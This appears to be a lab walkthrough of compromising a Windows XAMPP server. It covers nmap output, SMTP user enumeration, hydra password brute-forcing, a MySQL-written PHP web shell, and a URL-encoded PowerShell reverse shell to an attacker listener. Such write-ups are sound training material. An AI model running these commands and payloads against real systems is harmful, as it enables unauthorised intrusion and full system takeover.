----

First we run nmap to enumerate the services.

```bash
sudo nmap -sC -sV 10.129.163.202
```

```
PORT     STATE SERVICE       VERSION                                              
21/tcp   open  ftp                              
| fingerprint-strings:                                                
|   GenericLines:                                            
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...            
|   Help:            
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     214-The following commands are implemented
|     USER PASS ACCT QUIT PORT RETR
|     STOR DELE RNFR PWD CWD CDUP                                                  
|     NOOP TYPE MODE STRU                                                          
|     LIST NLST HELP FEAT UTF8 PASV                                                
|     MDTM REST PBSZ PROT OPTS CCC                                                 
|     XCRC SIZE MFMT CLNT ABORT                                                    
|     HELP command successful                                                      |   NULL:                                                                          
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered              
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY   
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.163.202/dashboard/                   
443/tcp  open  ssl/https
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP                  
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY     
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB          
| mysql-info:                                                     
|   Protocol: 10                                                  
|   Version: 5.5.5-10.4.24-MariaDB                                
|   Thread ID: 11                                                 
|   Capabilities flags: 63486                                     
|   Some Capabilities: SupportsLoadDataLocal, InteractiveClient, IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, FoundRows, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, ODBCClient, LongColumnFlag, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultip
leResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit                                                  
|   Salt: r<tS$XoFO;u_\0v%QI\q
|_  Auth Plugin Name: mysql_native_password         
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-01-12T13:45:54+00:00; +29s from scanner time.
| ssl-cert: Subject: commonName=WIN-EASY            
| Not valid before: 2025-01-11T13:43:59             
|_Not valid after:  2025-07-13T13:43:59             
| rdp-ntlm-info:       
|   Target_Name: WIN-EASY                                          
|   NetBIOS_Domain_Name: WIN-EASY                                  
|   NetBIOS_Computer_Name: WIN-EASY                                
|   DNS_Domain_Name: WIN-EASY                                                 
|   DNS_Computer_Name: WIN-EASY                                               
|   Product_Version: 10.0.17763                                               
|_  System_Time: 2025-01-12T13:45:46+00:00     
```

We first try to enumerate users / passwords

Since smtp is running we can use smtp-user-enum to enumerate users.

```bash
smtp-user-enum -M RCPT -D inlanefreight.htb -U users -t 10.129.163.202
```
It told us the user `fiona@inlanefreight.htb` is present.

We then tried to brute force the password for the smtp service.

```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlist/rockyou.txt 10.129.163.202 smtp
```

This resulted in the password `fiona:987654321`. I tried to login against FTP and SMTP with these credentials but it did not work. 
Next I tried to login to mysql.

```bash
mysql -u fiona -p987654321 -h 10.129.221.196
```

When showing the databases I saw there was a phpmyadmin database. 
I also know that `xampp` is running as a webserver so I tried to create a php-file that can execute code. This can be done inside mysql.

I had to lookup the default xampp location and figured out it was inside the htdocs directory.
```bash
use phpmyadmin;
SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

Now I can send GET requests in with a command. I used burp-suite for this

```
GET /shell.php?=whoami HTTP/1.1
nt authority\system
```

Now I know this works, I try to get a reverse shell.

I setup a netcat listener on my attack host and use the following GET request

```
GET /shell.php?cmd=powershell+-NoP+-NonI+-W+Hidden+-Command+"%26+{+$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.10.14.197',9001)%3b+$stream+%3d+$client.GetStream()%3b+[byte[]]$bytes+%3d+0..65535|%25{0}%3b+while(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){+$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,$i)%3b+$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b+$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b+$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b+$stream.Write($sendbyte,0,$sendbyte.Length)%3b+$stream.Flush()+}%3b+$client.Close()+}" 
```

This is a PowerShell reverse shell and after sending it I got an nt authority\system shell on my netcat listener.

